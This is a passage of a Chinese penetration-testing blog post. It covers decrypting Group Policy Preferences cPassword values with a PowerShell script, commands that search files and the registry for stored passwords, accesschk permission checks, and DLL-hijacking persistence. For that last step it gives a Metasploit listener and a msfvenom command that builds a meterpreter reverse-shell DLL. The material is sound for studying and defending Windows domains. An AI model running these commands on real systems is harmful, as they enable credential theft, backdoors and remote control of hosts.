+<p><a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/cc422924.aspx</a></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP7.png" alt="此处输入图片的描述"></p>
+<p>我们可以借助下面这个项目将明文密码还原</p>
+<p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p>
+<p>该脚本可在域内主机上执行，能够自动查询共享文件夹\SYSVOL中的文件，还原出所有明文密码</p>
+<p><strong>测试如下图</strong></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP8.png" alt="此处输入图片的描述"></p>
+<p>当然，仅仅为了解密cpassword=”9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U”，我们可以对以上powershell脚本的功能简化</p>
+<p><strong>简化代码如下：</strong></p>
+<pre><code>function Get-DecryptedCpassword {
+    [CmdletBinding()]
+    Param (
+        [string] $Cpassword
+    )
+
+    try {
+        #Append appropriate padding based on string length  
+        $Mod = ($Cpassword.length % 4)
+
+        switch ($Mod) {
+        &apos;1&apos; {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
+        &apos;2&apos; {$Cpassword += (&apos;=&apos; * (4 - $Mod))}
+        &apos;3&apos; {$Cpassword += (&apos;=&apos; * (4 - $Mod))}
+        }
+
+        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
+
+        #Create a new AES .NET Crypto Object
+        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
+                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
+
+        #Set IV to all nulls to prevent dynamic generation of IV value
+        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
+        $AesObject.IV = $AesIV
+        $AesObject.Key = $AesKey
+        $DecryptorObject = $AesObject.CreateDecryptor() 
+        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
+
+        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
+    }
+
+    catch {Write-Error $Error[0]}
+}
+Get-DecryptedCpassword &quot;9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U&quot;
+</code></pre><blockquote>
+<p>也就是说：域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹\SYSVOL下，默认所有域内用户可访问，虽然被加密，但很容易被解密</p>
+</blockquote>
+<p>为此，微软发布了补丁KB2962486，下载地址：</p>
+<p><a href="https://technet.microsoft.com/library/security/ms14-025" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms14-025</a></p>
+<p>系统打了补丁后，组策略中无法设置用户名密码，如下图</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP9.png" alt="此处输入图片的描述"></p>
+<p>除了 Groups.xml 以外，其他几个策略首选项文件也可能存在 “cPassword” 属性</p>
+<pre><code>Services\Services.xml
+
+http://msdn.microsoft.com/en-us/library/cc980070(v=prot.13)
+ScheduledTasks\ScheduledTasks.xml
+
+http://msdn.microsoft.com/en-us/library/cc422920(v=prot.13)
+http://msdn.microsoft.com/en-us/library/dd341350(v=prot.13)
+http://msdn.microsoft.com/en-us/library/dd304114(v=prot.13)
+Printers\Printers.xml
+
+http://msdn.microsoft.com/en-us/library/cc422918(v=prot.13)
+Drives\Drives.xml
+
+http://msdn.microsoft.com/en-us/library/cc704598(v=prot.13)
+DataSources\DataSources.xml
+
+http://msdn.microsoft.com/en-us/library/cc422926(v=prot.13)
+</code></pre><h2 id="0X04-辅助的命令"><a href="#0X04-辅助的命令" class="headerlink" title="0X04 辅助的命令"></a><strong>0X04 辅助的命令</strong></h2><h3 id="1-下面的命令将在文件系统中搜索包含特定关键字的文件名-可以指定任意多的关键字。"><a href="#1-下面的命令将在文件系统中搜索包含特定关键字的文件名-可以指定任意多的关键字。" class="headerlink" title="1.下面的命令将在文件系统中搜索包含特定关键字的文件名,可以指定任意多的关键字。"></a><strong>1.下面的命令将在文件系统中搜索包含特定关键字的文件名,可以指定任意多的关键字。</strong></h3><pre><code>C:\Windows\system32&gt; dir /s *pass* == *cred* == *vnc* == *.config*
+</code></pre><h3 id="2-搜索某些文件类型的关键字"><a href="#2-搜索某些文件类型的关键字" class="headerlink" title="2.搜索某些文件类型的关键字"></a><strong>2.搜索某些文件类型的关键字</strong></h3><pre><code>C:\Windows\system32&gt; findstr /si password *.xml *.ini *.txt
+</code></pre><h3 id="3-下面的两个命令可以用于grep注册表中的关键字，在本例中是“password”。"><a href="#3-下面的两个命令可以用于grep注册表中的关键字，在本例中是“password”。" class="headerlink" title="3.下面的两个命令可以用于grep注册表中的关键字，在本例中是“password”。"></a><strong>3.下面的两个命令可以用于grep注册表中的关键字，在本例中是“password”。</strong></h3><pre><code>C:\Windows\system32&gt; reg query HKLM /f password /t REG_SZ /s
+
+C:\Windows\system32&gt; reg query HKCU /f password /t REG_SZ /s
+</code></pre><h2 id="0X05-辅助的工具"><a href="#0X05-辅助的工具" class="headerlink" title="0X05 辅助的工具"></a><strong>0X05 辅助的工具</strong></h2><h3 id="accesschk-exe-来批量检查权限信息"><a href="#accesschk-exe-来批量检查权限信息" class="headerlink" title="accesschk.exe 来批量检查权限信息"></a><strong>accesschk.exe 来批量检查权限信息</strong></h3><p>这个工具来源于工具集 Sysinternals Suite ，感兴趣的可以在<a href="https://download.sysinternals.com/files/SysinternalsSuite.zips://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP9.png" target="_blank" rel="noopener">这里</a>下载。该工具的主要作用就是判断用户对于指定文件或者目录下面的所有文件的读写权限（R 是读，W 是写）</p>
+<h4 id="1-查看-d-test-目录下所有文件对每个用户组的权限情况"><a href="#1-查看-d-test-目录下所有文件对每个用户组的权限情况" class="headerlink" title="1.查看 d:/test 目录下所有文件对每个用户组的权限情况"></a><strong>1.查看 d:/test 目录下所有文件对每个用户组的权限情况</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP10.png" alt="此处输入图片的描述"></p>
+<h4 id="2-查看指定用户组对文件夹下文件的权限"><a href="#2-查看指定用户组对文件夹下文件的权限" class="headerlink" title="2.查看指定用户组对文件夹下文件的权限"></a><strong>2.查看指定用户组对文件夹下文件的权限</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP11.png" alt="此处输入图片的描述"></p>
+<h4 id="3-查看某个用户组对指定服务的权限"><a href="#3-查看某个用户组对指定服务的权限" class="headerlink" title="3.查看某个用户组对指定服务的权限"></a><strong>3.查看某个用户组对指定服务的权限</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP12.png" alt="此处输入图片的描述"></p>
+<h4 id="4-查看对某个用户组有写权限的所有服务"><a href="#4-查看对某个用户组有写权限的所有服务" class="headerlink" title="4.查看对某个用户组有写权限的所有服务"></a><strong>4.查看对某个用户组有写权限的所有服务</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP13.png" alt="此处输入图片的描述"></p>
+<h4 id="5-查看某个用户或用户组对某个注册表项的权限"><a href="#5-查看某个用户或用户组对某个注册表项的权限" class="headerlink" title="5.查看某个用户或用户组对某个注册表项的权限"></a><strong>5.查看某个用户或用户组对某个注册表项的权限</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP14.png" alt="此处输入图片的描述"></p>
+<p>这里 hklm 是 HKEY_LOCAL_MACHINE 的缩写，HKEY_CLASSES_ROOT 的缩写是 hkcr </p>
+<h2 id="0X06-权限维持"><a href="#0X06-权限维持" class="headerlink" title="0X06 权限维持"></a><strong>0X06 权限维持</strong></h2><p>后门是权限维持的必要手段，那么怎么才能安放一个好的后门就非常有技巧，之前我在前面文章中讲过影子账户的创建，感兴趣的同学可以移步 <a href="http://www.k0rz3n.com/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/">这里</a></p>
+<p>当然还有一种更加复杂并且隐蔽的方法：DLL 劫持，这个方法不仅仅在创建后门的时候被经常用到，在 Bypass UAC 的时候也是一种核心的手段</p>
+<h3 id="1-简单的介绍一下"><a href="#1-简单的介绍一下" class="headerlink" title="1.简单的介绍一下"></a><strong>1.简单的介绍一下</strong></h3><p>我们知道，程序在编译的时候往往为了节约空间不会将运行时用到的所有的库都静态编译进 exe 文件中，这样就意味着我们在运行程序的时候程序会去系统中加载需要的动态链接库，这就是我们所说的 DLL (Linux 下的动态链接库是 .so 文件，windows 下是 .dll)。</p>
+<p>系统会有一个寻找 dll 文件的默认顺序，当将恶意的 DLL 文件放到其中一个路径下，并保证该恶意 DLL 先于合法的 DLL 被程序找到时就会发生 DLL 劫持；也可能是程序寻找的 DLL 文件名在系统中并不存在，这时我们只需将自己定制的 DLL 文件放到程序的搜索路径也可以达到目的。</p>
+<p>下面你可以看到在一个 32 位系统中 DLL 的搜索顺序：</p>
+<pre><code>1 - 应用加载的目录
+
+2 - 32-bit 系统目录(C:\Windows\System32)
+
+3 - 16-bit 系统目录 (C:\Windows\System)
+
+4 - Windows 目录(C:\Windows)
+
+5 - 当前工作目录 (CWD)
+
+6 - 环境变量中的目录 (system then user)
+</code></pre><p>通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有 python，那么 Path = C:\Python27 就是我们可以控制的路径，我们只需要将恶意定制的 DLL 文件放到这个目录就可以。</p>
+<h3 id="2-利用步骤"><a href="#2-利用步骤" class="headerlink" title="2.利用步骤"></a><strong>2.利用步骤</strong></h3><h4 id="1-首先在我的公网-vps-开启-msf-建立监听"><a href="#1-首先在我的公网-vps-开启-msf-建立监听" class="headerlink" title="1.首先在我的公网 vps 开启 msf 建立监听"></a><strong>1.首先在我的公网 vps 开启 msf 建立监听</strong></h4><pre><code>msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set lhost xxx.xxx.xxx.xxx
+lhost =&gt; xxx.xxx.xxx.xxx
+msf5 exploit(multi/handler) &gt; set lport 9999
+lport =&gt; 9999
+msf5 exploit(multi/handler) &gt; exploit
+
+[*] Started reverse TCP handler on xxx.xxx.xxx.xxx:9999 
+</code></pre><h4 id="2-利用-DllHijackAuditor-工具进行-dll-劫持检测"><a href="#2-利用-DllHijackAuditor-工具进行-dll-劫持检测" class="headerlink" title="2.利用 DllHijackAuditor 工具进行 dll 劫持检测"></a><strong>2.利用 DllHijackAuditor 工具进行 dll 劫持检测</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP16.png" alt="此处输入图片的描述"></p>
+<h4 id="3-在本地的-msf-上生成需要利用的-payload"><a href="#3-在本地的-msf-上生成需要利用的-payload" class="headerlink" title="3.在本地的 msf 上生成需要利用的 payload"></a><strong>3.在本地的 msf 上生成需要利用的 payload</strong></h4><pre><code>msf &gt; msfvenom -p windows/meterpreter/reverse_tcp l_host=xxx.xxx.xxx.xxx lport=9999 -f dll -o /root/ext-ms-win-kernel32-package-current-l1-1-0
+[*] exec: msfvenom -p windows/meterpreter/reverse_tcp l_host=xxx.xxx.xxx.xxx lport=9999 -f dll -o /root/ext-ms-win-kernel32-package-current-l1-1-0
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of dll file: 5120 bytes
+Saved as: /root/ext-ms-win-kernel32-package-current-l1-1-0
+</code></pre><p><strong>然后我将其放在软件相同的目录下，如下图：</strong></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP15.png" alt="此处输入图片的描述"></p>
+<h4 id="4-运行后获取-meterpreter-的shell"><a href="#4-运行后获取-meterpreter-的shell" class="headerlink" title="4.运行后获取 meterpreter 的shell"></a><strong>4.运行后获取 meterpreter 的shell</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP17.png" alt="此处输入图片的描述"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/JeYxI2usvJCwmijYEefmOw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/JeYxI2usvJCwmijYEefmOw</a>?<br><a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/16.html</a><br><a href="https://www.freebuf.com/vuls/92016.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/92016.html</a><br><a href="https://www.xuebuyuan.com/2082105.html" target="_blank" rel="noopener">https://www.xuebuyuan.com/2082105.html</a><br><a href="https://blog.csdn.net/Fly_hps/article/details/80641585" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/80641585</a><br><a href="http://blog.51cto.com/rangercyh/497497" target="_blank" rel="noopener">http://blog.51cto.com/rangercyh/497497</a></p>
+</div><div class="tags"><a href="/tags/渗透测试-技巧/">渗透测试 技巧</a></div><div class="post-nav"><a class="pre" href="/2019/01/28/对 SSL 技术的详细归纳/">对 SSL 技术的详细归纳</a><a class="next" href="/2019/01/27/渗透测试小技巧一：寻找EXP/">渗透测试小技巧一：寻找EXP</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://www.k0rz3n.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C&C</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kerberos/">Kerberos</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/learning/">learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/wireshark/">wireshark</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘-笔记/">备忘 笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习思考/">学习思考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞研究/">漏洞研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境搭建/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/论文/">论文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/笔记-协议分析/" style="font-size: 15px;">笔记 协议分析</a> <a href="/tags/工具-渗透测试/" style="font-size: 15px;">工具 渗透测试</a> <a href="/tags/开发-Github-备忘/" style="font-size: 15px;">开发 Github 备忘</a> <a href="/tags/Linux-渗透测试-备忘/" style="font-size: 15px;">Linux 渗透测试 备忘</a> <a href="/tags/配置-备忘/" style="font-size: 15px;">配置 备忘</a> <a href="/tags/笔记/" style="font-size: 15px;">笔记</a> <a href="/tags/J2EE-基础/" style="font-size: 15px;">J2EE 基础</a> <a href="/tags/网络安全-Google-Hacking-信息收集-渗透测试/" style="font-size: 15px;">网络安全 Google Hacking 信息收集 渗透测试</a> <a href="/tags/前端/" style="font-size: 15px;">前端</a> <a href="/tags/编程-Python-进阶-备忘/" style="font-size: 15px;">编程 Python 进阶 备忘</a> <a href="/tags/网络安全-Python语法/" style="font-size: 15px;">网络安全 Python语法</a> <a href="/tags/gcc-备忘-笔记/" style="font-size: 15px;">gcc 备忘 笔记</a> <a href="/tags/learning/" style="font-size: 15px;">learning</a> <a href="/tags/Windows-FTP搭建-备忘/" style="font-size: 15px;">Windows FTP搭建 备忘</a> <a href="/tags/CTF-Tools/" style="font-size: 15px;">CTF Tools</a> <a href="/tags/学习发现/" style="font-size: 15px;">学习发现</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/kali/" style="font-size: 15px;">kali</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/SQL/" style="font-size: 15px;">SQL</a> <a href="/tags/php语法/" style="font-size: 15px;">php语法</a> <a href="/tags/wireshark/" style="font-size: 15px;">wireshark</a> <a href="/tags/编程/" style="font-size: 15px;">编程</a> <a href="/tags/备忘-shell-Linux/" style="font-size: 15px;">备忘 shell Linux</a> <a href="/tags/Linux-备忘/" style="font-size: 15px;">Linux 备忘</a> <a href="/tags/备忘/" style="font-size: 15px;">备忘</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/网络安全-渗透测试-内网代理/" style="font-size: 15px;">网络安全 渗透测试 内网代理</a> <a href="/tags/渗透测试-局域网扫描/" style="font-size: 15px;">渗透测试 局域网扫描</a> <a href="/tags/备忘-dcoker-getshell-CTF/" style="font-size: 15px;">备忘 dcoker getshell CTF</a> <a href="/tags/渗透测试-技巧/" style="font-size: 15px;">渗透测试 技巧</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/网络安全-渗透测试-sqlmap/" style="font-size: 15px;">网络安全 渗透测试 sqlmap</a> <a href="/tags/静态检测/" style="font-size: 15px;">静态检测</a> <a href="/tags/转载/" style="font-size: 15px;">转载</a> <a href="/tags/Fuzz-XSS/" style="font-size: 15px;">Fuzz XSS</a> <a href="/tags/备忘-反向代理-配置/" style="font-size: 15px;">备忘 反向代理 配置</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/web安全-漏洞-CTF/" style="font-size: 15px;">web安全  漏洞  CTF</a> <a href="/tags/PHP-备忘-笔记/" style="font-size: 15px;">PHP 备忘 笔记</a> <a href="/tags/渗透测试-windows-后门/" style="font-size: 15px;">渗透测试 windows 后门</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/CSP/" style="font-size: 15px;">CSP</a> <a href="/tags/web安全-CTF-渗透测试-PHP/" style="font-size: 15px;">web安全 CTF 渗透测试 PHP</a> <a href="/tags/Java-备忘-笔记/" style="font-size: 15px;">Java 备忘 笔记</a> <a href="/tags/域渗透/" style="font-size: 15px;">域渗透</a> <a href="/tags/JSONP/" style="font-size: 15px;">JSONP</a> <a href="/tags/编程-C-类库/" style="font-size: 15px;">编程 C++ 类库</a> <a href="/tags/CTF-writeup/" style="font-size: 15px;">CTF writeup</a> <a href="/tags/web安全-CTF/" style="font-size: 15px;">web安全 CTF</a> <a href="/tags/web安全-MySQL-渗透测试/" style="font-size: 15px;">web安全 MySQL 渗透测试</a> <a href="/tags/编程-PHP-基础/" style="font-size: 15px;">编程 PHP 基础</a> <a href="/tags/Redis-备忘/" style="font-size: 15px;">Redis 备忘</a> <a href="/tags/web安全-漏洞分析/" style="font-size: 15px;">web安全 漏洞分析</a> <a href="/tags/漏洞研究/" style="font-size: 15px;">漏洞研究</a> <a href="/tags/网络安全-钓鱼-恶意代码分析-漏洞分析/" style="font-size: 15px;">网络安全 钓鱼 恶意代码分析 漏洞分析</a> <a href="/tags/密码学-网络协议/" style="font-size: 15px;">密码学 网络协议</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/网络安全-沙盒逃逸-Python/" style="font-size: 15px;">网络安全 沙盒逃逸 Python</a> <a href="/tags/SQL-语法/" style="font-size: 15px;">SQL 语法</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a> <a href="/tags/符号执行/" style="font-size: 15px;">符号执行</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/爬虫/" style="font-size: 15px;">爬虫</a> <a href="/tags/编程-PHP-进阶/" style="font-size: 15px;">编程 PHP 进阶</a> <a href="/tags/编程-JAVA-基础/" style="font-size: 15px;">编程 JAVA 基础</a> <a href="/tags/污点分析/" style="font-size: 15px;">污点分析</a> <a href="/tags/PHP-静态检测/" style="font-size: 15px;">PHP 静态检测</a> <a href="/tags/Windows-批处理-备忘/" style="font-size: 15px;">Windows 批处理 备忘</a> <a href="/tags/SQL-注入/" style="font-size: 15px;">SQL 注入</a> <a href="/tags/流量分析/" style="font-size: 15px;">流量分析</a> <a href="/tags/编程-C-基础/" style="font-size: 15px;">编程 C++ 基础</a> <a href="/tags/编程-进阶/" style="font-size: 15px;">编程 进阶</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/浅析 Kerberos 认证过程以及黄金票据和白银票据/">浅析 Kerberos 认证过程以及黄金票据和白银票据</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/C&C控制服务的设计和侦测方法综述(Drops from wooyun)/">C&C控制服务的设计和侦测方法综述(Drops from wooyun)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)/">如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/08/无脚本攻击 - 在不触碰窗台的情况下偷取馅饼(半机翻有删增)/">无脚本攻击 - 在不触碰窗台的情况下偷取馅饼(半机翻有删增)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/07/论白名单的不安全性与内容安全政策的未来(半翻译有删增)/">论白名单的不安全性与内容安全策略的未来(半机翻有删增)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/07/JSONP 劫持原理与挖掘方法/">JSONP 劫持原理与挖掘方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/05/爬虫爬取动态网页的三种方式简介/">爬虫爬取动态网页的三种方式简介</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/04/《白帽子讲 web 扫描》 阅读记录(下)/">《白帽子讲 web 扫描》 阅读记录(下)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/《白帽子讲 web 扫描》 阅读记录(上)/">《白帽子讲 web 扫描》 阅读记录(上)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/02/面向源代码的软件漏洞静态检测综述/">面向源代码的软件漏洞静态检测综述</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://math1as.com/" title="math1as" target="_blank">math1as</a><ul></ul><a href="https://www.zsxsoft.com/" title="zsx" target="_blank">zsx</a><ul></ul><a href="https://www.lorexxar.cn/" title="Lorexxar" target="_blank">Lorexxar</a><ul></ul><a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a><ul></ul><a href="http://www.cnblogs.com/iamstudy/" title="L3m0n" target="_blank">L3m0n</a><ul></ul><a href="http://www.pupiles.com" title="pupiles" target="_blank">pupiles</a><ul></ul><a href="http://f1sh.site/" title="f1sh" target="_blank">f1sh</a><ul></ul><a href="https://www.leavesongs.com/" title="phithon" target="_blank">phithon</a><ul></ul><a href="http://sh3ll.me/" title="Chu" target="_blank">Chu</a><ul></ul><a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a><ul></ul><a href="http://blog.cal1.cn/" title="超威蓝猫" target="_blank">超威蓝猫</a><ul></ul><a href="https://ricterz.me" title="RicterZ" target="_blank">RicterZ</a><ul></ul><a href="https://cyto.top/" title="Cytosine" target="_blank">Cytosine</a><ul></ul><a href="http://foreversong.cn/" title="ADog" target="_blank">ADog</a><ul></ul><a href="http://www.ckj123.com/" title="cjk123" target="_blank">cjk123</a><ul></ul><a href="http://arch0n.sumblog.cn" title="August" target="_blank">August</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
